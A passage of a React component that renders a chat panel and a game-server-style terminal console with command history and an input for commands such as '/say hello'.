                    <div style={{ wordBreak: 'break-word' }}>{m.text}</div>
                  </div>
                ))}
              </div>

              {/* Chat Input */}
              <div style={{ padding: 12, borderTop: `1px solid ${colors.border}`, background: 'rgba(0,0,0,0.2)' }}>
                <div style={{ display: 'flex', gap: 8 }}>
                  <input
                    type="text"
                    value={chatInput}
                    onChange={(e) => setChatInput(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && sendChat()}
                    placeholder="Type a message or /command..."
                    maxLength={120}
                    style={{
                      flex: 1,
                      padding: '8px 12px',
                      border: `1px solid ${colors.border}`,
                      background: 'rgba(255,255,255,0.04)',
                      color: colors.text,
                      borderRadius: 8,
                      fontSize: 13,
                      outline: 'none',
                    }}
                  />
                  <button
                    onClick={() => sendChat()}
                    style={{
                      padding: '8px 16px',
                      background: colors.green,
                      color: '#000',
                      fontWeight: 700,
                      border: 'none',
                      borderRadius: 8,
                      fontSize: 13,
                      cursor: 'pointer',
                    }}
                  >
                    Send
                  </button>
                </div>
              </div>
            </>
          ) : (
            <>
              {/* Terminal View */}
              <div
                ref={terminalLogRef}
                style={{
                  flex: 1,
                  padding: 12,
                  background: colors.terminal,
                  overflowY: 'auto',
                  fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace',
                  fontSize: 12,
                  lineHeight: 1.6,
                }}
              >
                {terminalHistory.map((item, idx) => (
                  <div
                    key={idx}
                    style={{
                      color:
                        item.type === 'you'
                          ? colors.green
                          : item.type === 'player'
                          ? '#58a6ff'
                          : colors.textDim,
                    }}
                  >
                    {item.text}
                  </div>
                ))}
              </div>

              <form
                onSubmit={handleTerminalSubmit}
                style={{
                  padding: '8px 12px',
                  background: colors.terminal,
                  borderTop: `1px solid ${colors.border}`,
                  display: 'flex',
                  alignItems: 'center',
                  gap: 8,
                }}
              >
                <span style={{ color: colors.green, fontFamily: 'monospace' }}>{'>'}</span>
                <input
                  type="text"
                  value={terminalInput}
                  onChange={(e) => setTerminalInput(e.target.value)}
                  placeholder="Execute command (e.g. /say hello, /time set day)..."
                  style={{
                    flex: 1,
                    background: 'transparent',
                    border: 'none',
                    color: colors.text,
                    fontFamily: '"Cascadia Code", "Fira Code", Consolas, monospace',
                    fontSize: 12,
                    outline: 'none',
                  }}
                />
              </form>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
